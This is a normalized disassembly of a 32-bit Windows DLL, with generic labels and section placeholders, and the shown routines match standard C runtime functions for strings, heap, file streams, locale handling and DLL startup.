mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call sub_1000aa1a
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000a821
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax edi
sub_10009ae0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_10009b1d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10009b0d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10009140
pop ecx
sub_10009b3e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1000f0d0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_10009b5e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_1000aa1a
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000a821
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_10009c27
push 0x8
push r--data
call sub_1000f940
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_1000eb4d
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1000be04
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1000baaf
push 0x214
push 0x1
call sub_1000f19d
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_1000f8e9
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000f852
mov [ rw-data ] eax
call sub_1000f289
test eax eax
jns r-xdata
call sub_1000eb6b
jmp r-xdata
call sub_1000f985
retn 0xc
xor eax eax
inc eax
push edi
call sub_1000bd96
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1000ee18
call sub_1000f797
test eax eax
js r-xdata
call sub_1000bae3
jmp r-xdata
push esi
call sub_10009957
pop ecx
jmp r-xdata
push edi
push esi
call sub_1000bb20
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10009d00
jmp r-xdata
call sub_1000f4ce
call sub_1000bae3
call sub_1000eb6b
call sub_1000f4ce
jmp r-xdata
call sub_1000f521
test eax eax
js r-xdata
push 0x0
call sub_1000ec2b
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10009d8b
push 0xc
push r--data
call sub_1000f940
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10004ed0
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10009c27
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10009c27
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10004ed0
push edi
push 0x0
push ebx
call sub_10009c27
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1000f985
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_10009d8b
pop ecx
pop ebp
retn 0xc
call sub_1000fc99
sub_10009ea4
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10009ef0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10009957
pop ecx
sub_10009f10
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10009f96
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10009991
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10009957
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1000cd91
pop ecx
call sub_1000b7fe
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1000b7fe
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000b7bc
pop ecx
mov [ esi ] eax
push esi
call sub_1000cd91
pop ecx
test eax eax
je r-xdata
call sub_1000b7fe
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000b7bc
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_1000a043
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_1000a103
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10009611
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1000b7fe
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001010a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1000ea36
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000ff1b
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000a220
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1000a270
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1000a2b6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1000b7fe
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1000b7ac
mov eax esi
sub_1000a319
push 0xc
push r--data
call sub_1000f940
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_1000f985
retn
call sub_100109de
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_10010747
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a3cb
mov eax [ ebp - 0x1c ]
call sub_1000b7fe
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10010b20
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1000a3ec
push 0xc
push r--data
call sub_1000f940
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setne al
cmp eax ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] edi
push edi
call sub_10010669
pop ecx
mov [ ebp - 0x4 ] ebx
test [ edi + 0xc ] 0x40
jne r-xdata
call sub_1000f985
retn
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push edi
call sub_10010d42
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a4ee
mov eax [ ebp - 0x1c ]
push edi
call sub_10010c72
mov esi eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
push edi
call sub_1000aa1a
mov [ ebp - 0x1c ] eax
push edi
push esi
call sub_10010d0e
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_1000a4f8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_10010ef9
push esi
mov edi eax
call sub_10010ec8
push esi
call sub_10010d42
push eax
call sub_10010e04
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10009957
and [ esi + 0x1c ] 0x0
pop ecx
sub_1000a565
push 0xc
push r--data
call sub_1000f940
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10010669
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000a4f8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a5d1
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_1000f985
retn
mov eax [ ebp - 0x1c ]
sub_1000a5d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10009611
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1000b7fe
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001010a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_1000ea36
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000ff1b
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000a6ef
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000a5d9
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_1000a71b
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1001108f
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1001108f
pop ecx
sub_1000a821
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10010d42
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10010592
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10011903
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_10011a20
pop ecx
test eax eax
jne r-xdata
call sub_10010592
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10011903
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_100119d7
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1001111c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1000a985
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1000a821
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_1000a9b8
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_1000a985
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_1000a985
sub_1000aa1a
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_10009611
call sub_1000b7fe
mov [ ebp - 0x26c ] eax
test esi esi
